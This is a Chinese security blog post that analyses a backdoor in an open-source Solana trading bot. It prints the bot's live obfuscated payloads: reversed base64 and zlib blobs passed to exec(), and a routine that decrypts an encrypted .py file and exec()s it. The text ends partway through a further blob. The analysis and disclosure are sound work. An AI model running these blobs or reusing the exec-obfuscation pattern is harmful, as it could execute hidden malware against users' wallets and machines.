---
title: 某Web3开源软件后门挖掘
date: 2024-04-21 17:27:00
cover: https://s2.loli.net/2024/04/23/rPNYsXm4F8ZtT7M.png
tags:
  - Web3
  - 逆向
  - 开源软件
  - Solana
categories:
  - 逆向实况
keywords: Web3,Solana,Backdoor
description:  reverse a backdoor in an open source software
---
# 河坝老哥狠狠撕开开源软件的后门（）

## Chapter 1 前情提要👀

　　最近有群友分享了一张截图，不多废话，直接上图（图片经过处理）
![哦豁](https://s2.loli.net/2024/04/22/szrbSV81jtINYXO.png)<br>
　　这下纯纯幽默了，我赶紧去Github上看看什么成分。虽然很快啊很快，原作者就commit掉了backdoor，但是通过查看branch的历史记录，还是下载到了确定有问题的那个版本64e83a4，赶快端上来罢！😋

---

## Chapter 2 神秘的匿名lambda函数🤔
　　首先啊首先，直接去看上面爆料图片中提到的py文件，会发现它并不是个py文件，而是一个二进制文件，直接读是不行的。<br>
　　找找别的呗。很快啊，在同为utils目录下找到了两个可疑文件，一个是data.py，里面存了一个RSA私钥；另一个是features.py,这个文件就很有意思了，里面只有一行python代码，给大家欣赏一下，原汁原味儿。说实话我也第一次见这种用法，见过PHP一句话，powershell一句话，我学识浅薄是个菜狗，带b64和zlib压缩的python一句话第一次见。

```python
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
``` 

　　他干什么了呢？

1. 定义了一个接受一个二进制数据形参__的匿名函数并实例化到_
2. 将二进制payload作为参数传进匿名函数
3. 倒序
4. 导入base64标准库b64解码
5. 导入zlib标准库解压缩
6. 用exec()执行解出来的payload

　　对静态查杀特攻了属于是，不过这么折腾多少是有点此地无银三百两了（还有二进制的.py文件）

　　OK,我们来看看它exec了个什么东西
```python
import base64
import zlib
payload=b'<payload here>'
print(zlib.decompress(base64.b64decode(payload[::-1])))

Out：
"exec((_)(b'=E/7gowB//33n7vU3agNhCy9rKyxA60QQn5+OMkGJyxmF5lMTWCG0g5nS8fThYc8g0qGw6D/QgmAQABnQcUuSIC/AzQYgQXwQQLHZBjqNT3qo8w2uIyosoX8DK+mDxzOYZTM/erlnPQUj98pl2YyrW6fwwmOXIY2UvhwdL0PE3poaa6Pc1u7wfIX48xHq+qOm/2A6gAUMnj4ecrb6FvZppW/SghZnRiCh8/I6li1FTCpSBLwAe1JFXmM3KGVQ59Lgb2awiKVFMuWFylmlAHeFdRvy7FPyAmaLhQt+fv4p9/WZ5BMHNGRXO27YekedmEv7zl6xMmBXSLXaRGHMARfXYUl148Qz+G4lj0SPrqCBgk3WuxaWV7dlRIJpNnCX7HZH2NpOkE4BaPaICzcDLAYjeCO+6gYI9oQteT6Z/zoyvutr6bAwBF/Eat3Vb4zcmK5bO4iltrbgWWP5Gx/XpA+G7avr/h6Ufc953HFh3uM4x3PXUqcFpEAypWI0yqPj3pdgg2KwOQb5lEfqMUzKK6fMxp2HtcxQCfXyKPhpwDEdf24I3ZhVwL0PB4Ezu9lJsF3hYlsSnZmyNGHilQsq3t0ap0mIMA60EoM6NZJubiECfFZrbeZQFuFhy8S1vUvsh+6K7/R0mPCS/opiSzy+4CeybU7DRsLyfH6pRZKBlUhAdA+auZwl73Fb/15qXpjTo6Gsf8nVJSOWMc2adn9u/BCE53U2cc+j8du33E+577qgtnOIAEiJbM+3q6mP3QvopS1kAWkR7L1aM/3Z7htipdJxqWcib+iY4lKo2kDaJyS97SFi/OwxdpzA4rORNJ3lZPilVLbMDKMPYNpkiK9xWNITBXywO7OS65+QAGLbOWCJumjWdem9j+brqH1nKvDjhn+ITzNARjaMk0Km5jNkavwzFwqB2AWjtrlQ2f9G41UL2rW7sJIj4vWzCiWmORYsg11d24ZkrAz9fjN/w48AGMGwCk2/EfZguR68kf9fnAxrIDuQmPBEL004mTV/H2Ymx+zHjxgdI2iOkuD/FOegCk+tcgUwGglXNgQ7tp/yR0mvlFSnRUXTurBz/45I4bM0iN6FnR+N8EHhgcpwSy/RA2oIDPY+s8YD21N9xtqP8LNduIUTbdsbKvxU76wr7RTUKA2r008fT+roA29TV+bpbv+V8G91fN7hSF0CHbqOi4CAzYShu9wN71AOcKqSAnaDuwNb09XUsEAAit09y0GO1I/EBvmZ67Ho9I+tu17mhQwOL6fh8Fx8rNJZo+MrovHN/N17z/Rptg+MkRonvYwD5tMGd5Z9bjewDdLgqTeULfa4J/QuE0QGceMRmd0SmkBHNwpn5s0sAis/bKFaUmq5rpQSUg1H27C1SnNYK6yROPKXbDfCFtaTLZNuFieVCrjgOSzD7mf71GGxvCj89Q6Xyg5mN2aShJmWKcQo7MDnZVFMToH66dowqOm0nnTuqLPANgMj+kySVhpl5lSBN0Z/sbFhPMTKg5Z5BJs09sY72f/9A5Sox2clfMCfrgnuf6+Iqh7iT1hV83FBg5s+hVUZnPKi7pMK9kFP1Oq8LCtIrQvlBBUsEBOIWEAT0fgL/Uiv/zT4o1DJZ39132rovN/vXYEi979y5PU3rtoYx/GXmaF3/fzg+Rq89dMKUrnucWqtyJnvionR0D4P74z2T7BF2Jfo9JMtHwtP5YMzoeZ0sF+vJSM6ws5PThqvcquetW+WIv9LjFW8jMYg18i7JXT6ic6QcfkZSQpfGwc5b3MJ7On9LmQy8+XGzLLApqPzulKlLc3agaw72MT9U2JyS6hfnJuCo2Dd1hbCle/1wZm6UMcS1mhOwxf84498GVCYGZO73Xrj9BzwQEx+Zhn/Scy8CV/VEaIixeBBKAGfohXK413ihLI85vxsRky/MJisBGyOhavF9fBf5nqjllVWHStOu73boYOkNyOASR2N0EkHhREmjrt41GDP6N87js9wUL2ZwREshUHSuVRcfsGZDQo2vehTGECw89nPeqPQvFXhx+zG0JvPyCvnJHtZbohyb4bUPG/ZcVCpDNXdxVLAc0G4xfgH6h7W/bePHUerH2i/kA4eCMkCOtC2IHBtug+dR3NwvGmXHvIbCrUmKHX17w31GRWpKgnLd18nJjxf55nEWfiHg03u5yxVoPhz4os9H67GwgYwL2kEi403GNf00hG6McBZypelVjh4j1Vk4Rf7rodFRqI/hUCzq354STd1aTuD0dF81kIPjnmeU4Rr+g1OOcyARxInsZo14J4nQMQ12IsaEmhEKE1wOCBd9nJvnxn2iuFGg7VzPND7C8Izzt61k8RtLXhCqdjzQR+5tRhkoeXwJs04oSyzFIFyLcGsOeFnHMhGYGbCNLahAkZb2wG8eVNWLQpC5okCbAmAiclDnji5j2JvfQKqhXSuWrq5MZJzRaH5ANq5cZT7iA1ojuozAHtieRYmVgfk9hySbMGHA0LTv6+h6vmkJaZ/EQJP/XNAdmKzddlQ+qaRlAFNK+WS8k3Cf5wh2dWj8aCmzduZ6Rjcb9Jfod2Y+wgJjD7eP4RUpLJqusv/uXNEG1hFMGLpe4QpR9zE3n4K/IAf8H2Xt5BawSI/UFdf6w/2K5/PUq35Z0Vjx0RTUAYULtY56Uk4zzNwxcO+oDveEinCtyJtAa7v259FLr+pQcVLGoUTAgxYUdMSoCb9HpUb1VM9XnGYpo1zRbbGnso/ccZ02siXlkmS5roVlEn9jBiXVoLvGNGCl6bKytJGE0sy7Rwn+wR/5szRcEuHBD2DJG5B5TzTylohpFrSrTZ6RGOfKNRNLFb5uzOIpc4PQ+Q4S9MuHOZtv75lgkJGJNxZ3p6loBaa+fgumHR1hbwLWa4nLIlItYLYdHlAcvHk6zw0Iyqasz26N9692cbJSpT4X8xcaQV2HinvOiO6uYyAry63s2bEdch3fqrdUfQlp6fw03VyzTWVUPI5piJwpteJ5Kkt9LOTMfEvB/KR9eAJNnlokVZqyn6ukFGQmuZCba8Gy1tKDYk5dFu7C3yz50mTBqr4T8oUIGQsyfiRW4FxGxC3YGDjR/X/2elQWioIdlqsKckBWv1pMRFxtl/jjEqYsIdXMqWNp9p8uUbIZvao+bQDT4JS2+UnSBIludvIIA8BEinow2lJ2pilxewuC1lTnCSThMtIhZOuVHeMDh0kv9FiRglIw1KJOKj6OpWkn9GrZC3+g8DBqziwgSSSvaL/GlWG9gxUwYJN2KoTZ1VXGPfpnUzXE00UdhOYpbcmgHRy3R6qhwPTjagHvRdwXU0OAfmCwXzNgKLJ0wzDH8zOX1Js8Dyvv3YdoQLwIfU58leSq7a01TqpW53daMdZiDveRMBcxSDIVvOQbuQd5+2tPhGD/mMW3przOVepXfeLSRmKZcelBr534wd3AX/TjrjkYqt1p/uutwwwRxucCZB6HeZJgIx65kKGEwHC0GT2/j8PuFPLbItJOa8o3ywJB3/buZW9DNwPv1g6bSPIvTMqWJBBpcgxCW7THPoPgM8ezkTUPlMDOD7G0MG1E3u1P+SbiR/iK4KkdfVANkrcpsnnLLrJG8ifujH6A4sz6g/d7GMW9A4YRoipTFEnpAuNYZfFg3Z1xqteLBEviuGNpJ3CgMmr7KaKGKSRVM8BJR0ESGOx0aDv623XbqzhUQE8umbVN38Vy7GYKjEwfxOCYM80dMsbabqCLjeBAnuJVfomOR+MjZ2e/AiaiMEbnjP0rcC8Hlkc3p6Yrwutu0Q7tKFHSxtwKVEe98tW1OXTM1WVcgMBUmNVxTGsqLVQ0qQgwwRH8ehGAyIddDdaTJ3tLlCGUqEjy3IqeM4Zui4WZGaJBwBgJDZOkmcILW3mJn4gOvRp27g9F/+u1hAAw+cNrzGuS+/N9bGtxlh8+KalK207gx/Rm0gh/JSCiHbwl3ij6CIeA6YQR2aX3RUhtK09Y9xju7bsYbaaAg0r1+WOXb87II4Riw9g7Mxg5JyJTWvGa09h5IbxwhjVbphfOneB9GCO6A79+TkxBvyaUUaKg8/VREAHSLOguCX6kft6AC4RkuTD5mbLpBMTRauT5U0SK+mRFwAS8qZffv9yBj9oQW6HVlsOYch+E5h+G7Zp4d3ybdQQjCtey/OzHa4F/udRPUkpTl32T2i5P3W/Ma4xnlp9bS6wRmTkSbgJjotI9yO6zKLRBBa1F0YN0FRIH41d3RlaMU5a9oPV5Jem4N81IGwuisV8MbBctMwfempcT+jShB7aBJciGN65YUaQDFBTs2DsxzJAmUib6f+zM63VTxVBFq8Y8UTYY/rD4R55B0ZqT5GGqC5qb973/M2CQxZe1HtpFPUNYX9wSZtwPhqFQRLht4eTmQwTyLdfWG9rFKy8pvrfFetzbobB+h4/zw00DOrLZax6mmp6GI5Xs8vP18dsy1TxzTGQxbEzfz9+geo3rMiTpCYP3zF/W4++rIjxsAuMP4qlwpuD9cvUpD4lnZFKd4VwUA5b7sAM8Jev+hxkq/PUXZhCD6rfN7TdEdX2Bv77CUGMrPwDoWYQKoB+cfX+9eRyD1MfvaMdWog6oDGwmeTZzyC87gbpxSRTbtyTBf0qkX7HOThatYwlfB7hixUkyMXUiycD/iqdjCGuOoZTbHMqirkWeJR31IPp4YLs+lJQElYGze6aHN7CVGdN1PKpwM0HgbnwkJ8KRtNRVtDAtodQhZn7DsQDRryLRXnVBvFK+2C5D9p8pgG5A38gyE1pKM95napkuxgVKEKsNrAeWxZPf7IRxdE9QlverQoRmokLwI+MBuQBoTAiRH/S9eZ5Sune5sXM1wZwATn4EeHwY9EC75uxfT/Kbb/qkhlRZd3/OnsMLAFLuQFd/FRbK8qD0Y39GgxwhT4ngrXC4FD1cxjRwPmHfpZ6SUH5GDm3XbS2QKEdCq0lW5Uw1qURCKB7JCgSqskd+hvKLbLXVpHxABD+2WLDRzDsSEVqeQAdPhoVWT2RY8S6sI3HVXENrrHc+mRBZmkbibpM8a1DnNgvtcJTi2bLXqAR0NwRHuTwMgpndnN6oFrx4q3EJJQcEDutGA/gS5KnRiCM44MPQO3TQSUJMO6ZMmhFR06Q1QjOggypluyuyNIPbirLuIfHnkOrmsdxxuVbjKHwz9s+wQA9D/JFWWAcnjWyZK4yF1uXO2dz+XEnByrTUL/8rwuL7imGS6PPmiv6LAOiMr2kFloRBAZ3uBWgqEZNtdk/ldO9Y6L1Xd04MkpKY2C6JP6NgUqKkGh1qO/TftjNSsVCmkWvuL+M0Yv8njjcPXnd3qiXB/LvgY1laux7V3HsEKcYmAULQtTRCD08QYf8r3qkEoXzJV4rSgmpJgl3s7pt06//ee/T6///NP//b+Ulrt1rInMli0A9fd0szMz+W3MxYfYqWzMNk87TdYRyqUxuW0lVwJe'))"

```
　　测🐎，属实是😅<br>
　　本来是想着复制复制运行运行，结果™的套了10层往上，受不了了，改改结构上调试器和断点了。<br>
　　解出来是这样的:
```python
from colorama import init, Fore, Style
init(autoreset=True)
def handle_additional_features(sol_balance):
        # Handle BUY_DELAY
        buy_delay_valid = False
        while not buy_delay_valid:
            try:            
                BUY_DELAY = int(input(f"{Fore.YELLOW}Enter BUY_DELAY (in seconds, 0 for immediate purchase after launch): {Style.RESET_ALL}"))
                if BUY_DELAY >= 0:
                    buy_delay_valid = True
                    if BUY_DELAY == 0:
                        print(f"{Fore.GREEN}BUY_DELAY set to 0. Token will buy immediately after token launch.")
                    else:
                        print(f"{Fore.GREEN}BUY_DELAY set to {BUY_DELAY} seconds.")
                else:
                    print(f"{Fore.RED}Please enter a positive number.")
            except ValueError:
                print(f"{Fore.RED}Invalid input. Please enter a number.")
                # Handle AUTO_SELL_PERCENT
                auto_sell_percent = input(f"{Fore.YELLOW}Enable AUTO_SELL_PERCENT? (true/false): {Style.RESET_ALL}").lower() == 'true'
                sell_percent = float(input(f"{Fore.YELLOW}SELL_PERCENT: {Style.RESET_ALL}")) if auto_sell_percent else None
                
                    # Handle AUTO_SELL_DELAY
                auto_sell_delay = input(f"{Fore.YELLOW}Enable AUTO_SELL_DELAY? (true/false): {Style.RESET_ALL}").lower() == 'true'
                auto_sell_delay_milliseconds = int(input(f"{Fore.YELLOW}AUTO_SELL_DELAY_MILLISECONDS: {Style.RESET_ALL}")) if auto_sell_delay else None
                    # Handle USE_SNIP_LIST\n   
                use_snip_list = input(f"{Fore.YELLOW}Use USE_SNIP_LIST? (true/false): {Style.RESET_ALL}").lower() == 'true'
                snip_token_count = len(open("snip_token.txt").readlines()) if use_snip_list else None
                    # Handle RUG_CHECK\n
                rug_check_input = input(f"{Fore.YELLOW}Enable RUG_CHECK? (true/false): {Style.RESET_ALL}").lower()
                if rug_check_input == 'true':
                    RUG_CHECK = True
                    print(f"{Fore.GREEN}RUG_CHECK is enabled.")
                else:
                    RUG_CHECK = False        
                    print(f"{Fore.RED}RUG_CHECK is disabled.")
                    # Handle SNIP Amount
                quote_amount_valid = False    
                while not quote_amount_valid:
                    quote_amount = float(input(f"{Fore.YELLOW}Enter the amount of SOL for SNIP (must be 0.5 or higher, and not exceed your SOL balance): {Style.RESET_ALL}"))
                    if quote_amount >= 0.5 and quote_amount <= sol_balance:
                        print(f"{Fore.GREEN}SNIP Amount set successfully: {quote_amount} SOL")
                        quote_amount_valid = True       
                    elif quote_amount < 0.5:
                        print(f"{Fore.RED}The SNIP amount must be at least 0.5 SOL. Please enter a valid amount.")
                    else:
                        print(f"{Fore.RED}Not enough SOL in your balance for this SNIP amount. Please enter a lower amount.")
                        # Handle License Key Status
                        license_key_status = "disable"    
                        print(f"{Fore.YELLOW}License Key Status: {license_key_status}")
                        print(f"{Fore.YELLOW}You have not activated the system. Please contact me to purchase a License Key.")
```
　　手动格式化，缩进可能有点问题，大伙儿凑合凑合看吧<br>
　　不过有一说一，单纯的是一个业务逻辑，好像没什么太大的问题对吧(就是尼玛的套了30层娃，属实逆天)

---

## Chapter 3 幽默老哥的幽默钱包🤣

　　![是空的](https://s2.loli.net/2024/04/22/fEIxrAtuY7cXMqZ.png)
　　（钱包是空的，一刀乐都没有）<br>
　　反正大家是千万不要学这个，调试的时候动不动就把私钥啊API Token什么的写在配置文件里。正确做法是export到环境变量里面。真要哪天搞忘了或是写错了那就GG了。又让我想起来21年还是22年上海被拖库的那次，好家伙直接把开盒成本打低了一个数量级。可惜人家要20个BTC不然我用花呗买硬盘也要下一份下来。

---

## Chapter 4 解密二进制payload🙌

　　莱纳！我们来看看这个被爆的payload究竟干了个什么事情<br>
　　二进制payload不会自己被解释器执行，一定是有什么东西动态加载进来了。找一找，找到了main.py里的一个函数
```python
def decrypt_checkrug():
    encrypted_key = base64.b64decode(ENCRYPTED_KEY)
    nonce = base64.b64decode(NONCE)
    tag = base64.b64decode(TAG)
    private_key = RSA.import_key(PRIVATE_KEY)

    cipher_rsa = PKCS1_OAEP.new(private_key)
    key_aes = cipher_rsa.decrypt(encrypted_key)

    with open('utils/checkrug.py', 'rb') as f:
        ciphertext = f.read()

    cipher_aes = AES.new(key_aes, AES.MODE_EAX, nonce=nonce)
    decrypted_data = cipher_aes.decrypt_and_verify(ciphertext, tag)
    return decrypted_data.decode()


global_namespace = globals()
exec(decrypt_checkrug(), global_namespace)
```
　　典中典之解密之后exec，不多废话我们看看exec了个什么东西<br>
　　(多废话一句，他这个依赖还挺怪的，Crypto没进requirement，手动装了pycryptodome再改个大小写才好使)<br>
　　又是熟悉的payload
```python
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==wEEkRF/ff/+/X1ri3Upvxz1vb77y03WsV/mcdOpITnIgwmj/T3ylGIGJI1xU3QrJKPrYKCfEEBbsmryWHBVEQ5FQR5+zJVrItgoOMlccVtghx4bX7e7nNl9BgtGf1o+k5fFe7Msfc5Yr1vaXiF71hafjcHWlQJd2HcIkcL7PsNWqOZkdv71BXWBhTID/wTskLHf2l9cHy3DWevym97vqZpKKJuVRrO36Z3S2yfQOuKXCJuDfvHpZPYPbfoVMgOJzbeLlSlKW9xxT2bU2GX/ZBAp220Uq+8Jvdx/pRXccq4Qtk2m8WLgYnPf1TueWUqXrEIHRjLTIyi9FPMffz7EocVr1nmfjUxeFP7NxFWp2ewg+oCs7SyHdnKOawfGmic/V2zVw6yL1q+rX66I+PLf8ZExAM2nNdmDq9OcNHrv8955n3IaoTEgbouk7/zm/YBWqJn1AKQtEtzqrrQCk9ixVlB6KDALq51KkITSsBRx7a8pqcV1UPa2o/aQ3nSFlpd1y3T4/kNU3L7JkG8Lh6tZaDHS6Kl7YE7XaCImhLukqnbOStrpjSihPnM0HQMl7PKGfEtyH9sipmqb6AiF96JLj5sfxpXA7QYEsTakpybfmRaz7qtkN9woi3gJ/NrrYz/C52VVc5yzc3Qom+H1VRLVwfZZEz+emAnj5r46aeWsfwqVjH/zQwGktv2TVGQkdjCJbp3WeHQnGJ+eJ81zofDdJxnK68AdRq93W/OgUKQ6CvN1ktFjwOxr4plFLgThak/asZ7KE2G+uvF996dMb66n39Gvw7R1U7tU62YAoZIDd17W4J4rV4C6ZPvobv2tfzuB0vpVwzZXcFhN4MPZmF40RR5IkjgX+48KLusJPpZpidch/dxZB4wXG9CjSRFdtacOXnJoRlBYUwaowPn+U0rgmOrebIAvSw6FBJXWRcIyYBQzORtqRiDd7//3lWFQnp8ccqkUElG14J355jCwJdZqP3k4dkdTLhWaFPAGbMsXy9Q0FmbuKMPiT2rx38OZB/N3+m9TQoNetd0VRAyHMsK2mXf4iuWyvaIaDfCpQ8SVqaR49ArcWkiI9i9icq/3fuTfwiFxiXhMv/Bxy8fwyOCJ2TA9CWdfDwQ/9mYsL9HfVIkom1ZbvybMPFgtyz7nJZdEd0iaR3Zr15n8R+6+Gza4fVp2e+o1gqj+3H1O1gH12dtp/izyMtwK6PYPhi2JAqMC5V8cxn5/iTPwsfqROrlwI2AzuEpG7JoHm+efWtbdZmMJ89KpstWtm9DH9itQx3RAyAVoBAQ8j2FT3q16IKEc/BuVsx0/+